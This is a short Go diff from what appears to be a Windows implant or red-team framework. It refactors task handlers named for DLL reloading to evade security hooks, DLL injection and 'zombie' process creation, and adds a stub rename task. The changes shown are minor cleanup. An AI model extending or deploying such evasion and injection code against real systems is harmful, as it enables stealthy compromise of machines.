@@ -1,5 +1,4 @@
 //go:build windows
-// +build windows
 
 package task
 
@@ -32,10 +31,7 @@ func taskReload(_ context.Context, r data.Reader, _ data.Writer) error {
 	if err != nil {
 		return err
 	}
-	if err = evade.ReloadDLL(s); err != nil {
-		return err
-	}
-	return nil
+	return evade.ReloadDLL(s)
 }
 func taskInject(x context.Context, r data.Reader, w data.Writer) error {
 	d, z, v, err := DLLUnmarshal(x, r)
@@ -120,6 +116,9 @@ func taskZombie(x context.Context, r data.Reader, w data.Writer) error {
 	o[0], o[1], o[2], o[3] = byte(i>>24), byte(i>>16), byte(i>>8), byte(i)
 	o[4], o[5], o[6], o[7] = byte(c>>24), byte(c>>16), byte(c>>8), byte(c)
 	return nil
+}
+func taskRename(_ context.Context, _ data.Reader, _ data.Writer) error {
+	return device.ErrNoNix
 }
 
 // DLLUnmarshal will read this DLL's struct data from the supplied reader and
